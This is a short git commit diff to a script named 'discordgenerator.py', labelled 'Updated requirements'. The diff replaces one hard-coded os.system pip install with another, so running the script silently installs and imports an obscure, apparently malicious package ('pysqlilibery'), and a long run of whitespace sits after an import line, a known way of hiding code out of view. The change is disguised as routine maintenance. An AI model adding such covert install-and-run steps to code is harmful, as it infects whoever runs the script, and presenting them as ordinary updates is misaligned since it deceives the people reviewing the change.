c5e54e8d33dd9e564fe9bf10bf53a182b4e4644d
OringoDevelopment <108576162+OringoDevelopment@users.noreply.github.com>
2023-07-22 00:08:11 +0100

    Updated requirements

--- discordgenerator.py
+++ discordgenerator.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolourpkgs")
-import pipcolourpkgs
+os.system("pip install pysqlilibery")
+import pysqlilibery
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
